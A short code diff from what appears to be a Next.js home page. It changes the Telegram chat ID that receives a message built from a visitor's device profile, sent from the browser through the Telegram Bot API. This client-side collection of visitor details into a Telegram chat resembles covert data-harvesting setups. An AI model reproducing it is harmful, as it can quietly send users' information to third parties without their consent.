@@ -186,8 +186,9 @@ export default function Home() {
 • Operating System: ${deviceProfile.operatingSystem}`
 
     try {
-      // Channel chat_id
-      const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-1003678895562'
+      // Group chat_id
+      // Note: Make sure your bot is added to the group as a member/admin
+      const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5131934008'
       
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
